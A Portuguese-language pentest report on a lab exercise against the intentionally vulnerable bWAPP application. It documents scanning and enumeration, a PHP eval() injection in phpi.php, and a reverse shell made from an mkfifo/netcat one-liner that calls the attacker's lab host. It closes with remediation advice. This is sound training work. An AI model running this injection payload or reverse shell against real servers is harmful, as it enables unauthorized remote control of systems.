RELATÓRIO DE TESTE DE INVASÃO (PENTEST) – bWAPP

Alvo: 192.168.56.103 (VM Vulnerable Web) Atacante: 192.168.56.101 (Kali Linux) Data: 19 de Março de 2026

RESUMO EXECUTIVO
Este documento detalha o teste de invasão realizado na aplicação bWAPP. Foi identificada uma vulnerabilidade crítica de PHP Code Injection no componente phpi.php. A falha permite a execução remota de código (RCE), possibilitando que um atacante obtenha controle total do servidor web com os privilégios do usuário www-data.

 METODOLOGIA
O teste seguiu as fases padrão de um Pentest profissional:
1.	Reconhecimento e Varredura: Descoberta de ativos e serviços.
2.	Enumeração: Mapeamento de diretórios e arquivos da aplicação.
3.	Análise e Exploração: Identificação e exploração da falha de injeção.
4.	Pós-Exploração: Ganho de acesso interativo (Reverse Shell).




DESENVOLVIMENTO TÉCNICO
Reconhecimento e Varredura de Rede
A primeira etapa consistiu em localizar o alvo na rede local e identificar portas abertas.
•	Comando Netdiscover: netdiscover -r 192.168.56.0/24
•	Comando Nmap: nmap -v -n -sS -Pn --open -p- 192.168.56.103
 
 

Enumeração Web
Utilizou-se uma ferramenta de fuzzing para encontrar diretórios ocultos na aplicação.
•	Comando Feroxbuster: feroxbuster -u http://192.168.56.103 -w /usr/share/wordlists/dirb/common.txt

 





Identificação da Vulnerabilidade (PHP Injection)
Ao analisar o arquivo phpi.php, verificou-se que o parâmetro message processava entradas do usuário através da função vulnerável eval(). Inserir uma aspa simples (') causou um erro de sintaxe, confirmando a injeção.
•	Payload de Teste: http://192.168.56.103/bwapp/phpi.php?message=system("whoami");
 
 

 
 






Exploração e Ganho de Acesso (Reverse Shell)
Para transformar a execução de comandos em um terminal interativo, foi configurado um Reverse Shell utilizando a técnica de mkfifo.
Passo 1: Preparação do Receptor (Kali) No terminal do atacante, abriu-se uma porta para escuta: nc -nvlp 4444
 

Passo 2: Criação e Codificação do Payload Utilizou-se o site RevShells para gerar o código de conexão reversa e aplicou-se URL Encoding para garantir que o navegador transmitisse os caracteres especiais (como |, ;, &) sem erros.
•	Código Bruto: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.101 4444 >/tmp/f
	 
 

Encode:
 
 

Prova de Conceito (PoC)
Ao submeter o payload encodado via URL, o servidor bWAPP conectou-se de volta ao Kali Linux, entregando um shell interativo.
•	Confirmação: Execução dos comandos id e hostname dentro do servidor invadido.

 
 





CONCLUSÃO E MITIGAÇÃO
A vulnerabilidade encontrada é de severidade Crítica. O uso de funções que executam strings como código (como eval(), exec(), system()) deve ser evitado sempre que possível.
Recomendações de Segurança:
1.	Remover funções de execução: Substituir a lógica de eval() por estruturas de controle nativas (como switch/case).
2.	Sanitização de Input: Implementar filtros rigorosos para impedir que caracteres de sistema operacional sejam processados.
3.	Princípio do Menor Privilégio: Garantir que o serviço web não rode com permissões de administrador, limitando o impacto em caso de invasão.

